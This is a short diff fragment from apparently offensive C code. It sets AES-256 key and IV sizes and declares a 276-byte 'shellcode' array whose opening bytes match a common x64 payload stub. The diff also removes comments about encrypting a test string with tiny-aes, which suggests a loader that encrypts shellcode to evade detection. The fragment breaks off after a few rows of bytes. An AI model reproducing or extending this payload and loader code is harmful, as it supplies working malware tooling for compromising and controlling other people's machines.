@@ -6,8 +6,6 @@
 #define KEYSIZE 32   // 32 bytes for AES256
 #define IVSIZE 16    // 16 bytes for AES
 
-// "this is plaintext string, we'll try to encrypt... lets hope everything goes well :)" in hex
-// since the upper string is 82 byte in size, and 82 is not mulitple of 16, we cant encrypt this directly using tiny-aes
 const byte shellcode[276] = {
 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,
 0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,
